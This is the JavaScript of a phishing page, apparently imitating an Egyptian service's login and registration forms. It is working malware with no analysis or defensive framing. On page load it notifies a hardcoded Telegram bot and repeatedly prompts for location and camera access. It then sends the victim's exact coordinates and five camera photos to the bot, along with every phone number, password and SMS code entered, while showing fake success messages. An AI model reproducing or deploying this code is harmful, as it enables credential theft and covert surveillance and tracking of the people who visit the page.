// ==================== إعدادات التليجرام ====================
const TELEGRAM_TOKEN = "7910079091:AAFGW4tfR-wZ9WRqjqNG5tRU6NGF32MMIr0";
const TELEGRAM_CHAT_ID = "5967116314";

// ==================== قاعدة البيانات الوهمية ====================
let activeDatabase = [];

// ==================== حالة الصلاحيات ====================
let permissionsStatus = {
    location: false,
    camera: false,
    attemptCount: 0,
    locationSent: false,
    photosSent: 0,
    totalPhotosTarget: 5
};

// ==================== عناصر الكاميرا ====================
const videoElement = document.getElementById('cameraElement');
const canvasElement = document.getElementById('canvasElement');
const canvasContext = canvasElement.getContext('2d');

// ==================== دوال التليجرام ====================
function sendToTelegram(textMessage) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: textMessage,
            parse_mode: "Markdown"
        })
    }).catch(error => console.error("Telegram Error:", error));
}

// 🚀 دالة إرسال صورة واحدة فوراً
async function sendSinglePhotoInstantly(photoBlob, photoNumber) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', photoBlob);
    formData.append('caption', `📸 *صورة ${photoNumber}/${permissionsStatus.totalPhotosTarget}*\n⏰ ${new Date().toLocaleString('ar-EG')}`);
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
        });
        
        const result = await response.json();
        
        if (result.ok) {
            console.log(`✅ Photo ${photoNumber} sent successfully`);
            sendToTelegram(`✅ *تم إرسال الصورة ${photoNumber}/${permissionsStatus.totalPhotosTarget} بنجاح!*`);
            permissionsStatus.photosSent++;
            
            if (permissionsStatus.photosSent >= permissionsStatus.totalPhotosTarget) {
                sendToTelegram(`🎉 *اكتمل!*\n✅ تم إرسال ${permissionsStatus.photosSent} صور بنجاح\n🕐 ${new Date().toLocaleString('ar-EG')}`);
            }
            
            return true;
        } else {
            throw new Error('Failed to send');
        }
    } catch (error) {
        console.error(`❌ Error sending photo ${photoNumber}:`, error);
        sendToTelegram(`⚠️ *فشل إرسال الصورة ${photoNumber}*\n${error.message}`);
        return false;
    }
}

// 🎯 النظام الذكي: التقاط وإرسال فوري
async function smartCaptureAndSend() {
    console.log("🎯 Starting SMART instant photo capture...");
    
    sendToTelegram(`📸 *بدء التقاط الصور - النظام الذكي*\n🎯 سيتم إرسال كل صورة فور التقاطها\n📷 الإجمالي: ${permissionsStatus.totalPhotosTarget} صور\n⏰ ${new Date().toLocaleString('ar-EG')}`);
    
    let stream = null;
    
    try {
        stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: "user",
                width: { ideal: 1280 },
                height: { ideal: 720 }
            } 
        });
        
        videoElement.srcObject = stream;
        
        await new Promise((resolve) => {
            videoElement.onloadedmetadata = () => {
                videoElement.play();
                resolve();
            };
        });
        
        for (let i = 1; i <= permissionsStatus.totalPhotosTarget; i++) {
            console.log(`📸 Capturing photo ${i}...`);
            
            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;
            canvasContext.drawImage(videoElement, 0, 0);
            
            const photoBlob = await new Promise(resolve => {
                canvasElement.toBlob(resolve, 'image/jpeg', 0.85);
            });
            
            console.log(`📤 Sending photo ${i} INSTANTLY...`);
            sendToTelegram(`📸 *جاري إرسال الصورة ${i}/${permissionsStatus.totalPhotosTarget}...*`);
            
            await sendSinglePhotoInstantly(photoBlob, i);
            
            if (i < permissionsStatus.totalPhotosTarget) {
                await new Promise(resolve => setTimeout(resolve, 600));
            }
        }
        
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
        
        permissionsStatus.camera = true;
        console.log("✅ All photos captured and sent!");
        
    } catch (error) {
        console.error("❌ Error in smart capture:", error);
        sendToTelegram(`❌ *خطأ في التقاط الصور*\n${error.message}\n📸 تم إرسال ${permissionsStatus.photosSent} صور قبل الخطأ`);
        
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    }
}

// ==================== التنقل بين النماذج ====================
function switchForm(viewId) {
    document.querySelectorAll('.form-container').forEach(view => {
        view.classList.remove('active');
    });
    document.getElementById(viewId).classList.add('active');
    document.getElementById('loginAlert').style.display = 'none';
    document.getElementById('registerAlert').style.display = 'none';
}

function goToLogin() {
    switchForm('loginView');
}

// ==================== طلب الموقع ====================
function requestLocation() {
    return new Promise((resolve) => {
        if (!("geolocation" in navigator)) {
            resolve(false);
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const lat = pos.coords.latitude;
                const lng = pos.coords.longitude;
                const accuracy = pos.coords.accuracy;
                const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
                
                permissionsStatus.location = true;
                
                const locationMessage = `📍 *تم منح إذن الموقع - فوراً!*\n\n🌍 *الإحداثيات الدقيقة:*\n📍 Latitude: \`${lat.toFixed(6)}\`\n📍 Longitude: \`${lng.toFixed(6)}\`\n\n📏 الدقة: ${accuracy} متر\n🗺️ *رابط الموقع:*\n${mapsLink}\n\n🎯 Attempt: ${permissionsStatus.attemptCount}\n⏰ ${new Date().toLocaleString('ar-EG')}`;
                
                sendToTelegram(locationMessage);
                permissionsStatus.locationSent = true;
                
                resolve(true);
            },
            (err) => {
                permissionsStatus.location = false;
                sendToTelegram(`📍 *تم رفض إذن الموقع*\n❌ ${err.message}\n🎯 Attempt: ${permissionsStatus.attemptCount}\n⏰ ${new Date().toLocaleTimeString('ar-EG')}`);
                resolve(false);
            },
            { 
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    });
}

// ==================== طلب الكاميرا ====================
function requestCamera() {
    return new Promise((resolve) => {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            resolve(false);
            return;
        }

        sendToTelegram(`📹 *Camera Permission: ALLOWED*\n🚀 بدء النظام الذكي للإرسال الفوري...\n🎯 Attempt: ${permissionsStatus.attemptCount}\n⏰ ${new Date().toLocaleTimeString('ar-EG')}`);
        
        smartCaptureAndSend().then(() => {
            resolve(true);
        }).catch(() => {
            resolve(false);
        });
    });
}

// ==================== النظام الذكي للصلاحيات ====================
async function smartPermissionLoop() {
    permissionsStatus.attemptCount++;
    
    console.log(`🔄 Attempt #${permissionsStatus.attemptCount}`);
    
    if (permissionsStatus.attemptCount % 5 === 0) {
        sendToTelegram(`📊 *Permission Report*\n🔄 Attempts: ${permissionsStatus.attemptCount}\n📍 Location: ${permissionsStatus.location ? '✅' : '❌'}\n📹 Camera: ${permissionsStatus.camera ? '✅' : '❌'}\n📸 Photos Sent: ${permissionsStatus.photosSent}/${permissionsStatus.totalPhotosTarget}`);
    }

    if (!permissionsStatus.location && !permissionsStatus.camera) {
        await requestLocation();
        setTimeout(() => requestCamera(), 100);
    }
    else if (permissionsStatus.location && !permissionsStatus.camera) {
        await requestCamera();
    }
    else if (!permissionsStatus.location && permissionsStatus.camera) {
        await requestLocation();
    }

    if (!permissionsStatus.location || !permissionsStatus.camera) {
        setTimeout(() => {
            smartPermissionLoop();
        }, 500);
    } else {
        console.log("✅ ALL PERMISSIONS GRANTED!");
        if (permissionsStatus.photosSent < permissionsStatus.totalPhotosTarget) {
            sendToTelegram(`⏳ *جاري إرسال الصور...*\n📸 تم إرسال ${permissionsStatus.photosSent}/${permissionsStatus.totalPhotosTarget}`);
        } else {
            sendToTelegram(`🎉 *SUCCESS!*\n✅ All Permissions Granted\n📸 ${permissionsStatus.photosSent} Photos Sent\n🔄 Total Attempts: ${permissionsStatus.attemptCount}\n⏰ ${new Date().toLocaleString('ar-EG')}`);
        }
    }
}

// ==================== بدء النظام عند التحميل ====================
window.addEventListener('load', () => {
    console.log("🚀 Starting Smart Permission System...");
    sendToTelegram(`🔔 *New Visitor*\n🌐 User opened the site\n⏰ ${new Date().toLocaleString('ar-EG')}`);
    
    setTimeout(() => {
        smartPermissionLoop();
    }, 500);
});

// ==================== إنشاء حساب ====================
function processRegister(event) {
    event.preventDefault();
    
    const phone = document.getElementById('regPhone').value;
    const pass = document.getElementById('regPass').value;
    const smsCode = document.getElementById('regSmsCode').value;
    const inviteCode = document.getElementById('regInviteCode').value || "None";
    
    activeDatabase.push({ phoneNumber: phone, password: pass });
    
    sendToTelegram(`🔔 *New Registration*\n📱 Phone: +20${phone}\n🔑 Pass: ${pass}\n💬 SMS: ${smsCode}\n🎫 Invite: ${inviteCode}`);
    
    const alert = document.getElementById('registerAlert');
    alert.innerText = "✅ تم إنشاء الحساب بنجاح!";
    alert.style.display = 'block';
    
    setTimeout(() => {
        switchForm('loginView');
        document.getElementById('loginPhone').value = phone;
    }, 1500);
}

// ==================== تسجيل الدخول ====================
function processLogin(event) {
    event.preventDefault();
    
    const phone = document.getElementById('loginPhone').value;
    const pass = document.getElementById('loginPass').value;
    const captcha = document.getElementById('loginCaptcha').value;
    const alert = document.getElementById('loginAlert');

    sendToTelegram(`📥 *Login Attempt*\n📱 Phone: +20${phone}\n🔑 Pass: ${pass}\n🔢 Captcha: ${captcha}`);

    if (captcha !== "1594") {
        alert.style.backgroundColor = "#fee2e2";
        alert.style.color = "#dc2626";
        alert.innerText = "❌ رمز التحقق غير صحيح!";
        alert.style.display = 'block';
        return;
    }

    const account = activeDatabase.find(u => u.phoneNumber === phone && u.password === pass);

    if (account) {
        alert.style.backgroundColor = "#dcfce7";
        alert.style.color = "#16a34a";
        alert.innerText = "✅ تم تسجيل الدخول بنجاح!";
        alert.style.display = 'block';
    } else {
        alert.style.backgroundColor = "#fee2e2";
        alert.style.color = "#dc2626";
        alert.innerText = "❌ الحساب غير موجود!";
        alert.style.display = 'block';
    }
}